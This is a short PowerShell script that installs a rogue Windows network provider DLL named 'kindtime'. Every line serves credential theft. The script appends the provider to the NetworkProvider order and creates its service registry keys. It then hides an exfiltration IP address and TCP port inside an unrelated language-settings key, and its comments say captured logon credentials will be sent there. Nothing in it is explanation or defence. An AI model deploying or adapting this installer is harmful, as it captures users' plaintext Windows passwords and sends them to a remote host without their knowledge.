$path = Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order" -Name PROVIDERORDER
$UpdatedValue = $Path.PROVIDERORDER + ",kindtime"
Set-ItemProperty -Path $Path.PSPath -Name "PROVIDERORDER" -Value $UpdatedValue

New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime
New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider -Name "Class" -Value 2
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider -Name "Name" -Value kindtime
New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\kindtime\NetworkProvider -Name "ProviderPath" -PropertyType ExpandString -Value "%SystemRoot%\System32\kindtime.dll"

New-ItemProperty -Path HKLM:\system\currentcontrolset\Control\MUI\Settings\LanguageConfiguration -Name "ipa" -Value "8.8.8.8" -Force # this is the ip the creds will be sent to
New-ItemProperty -Path HKLM:\system\currentcontrolset\Control\MUI\Settings\LanguageConfiguration -Name "pt" -Value 6006 -Force # this is the tcp port the creds will be sent to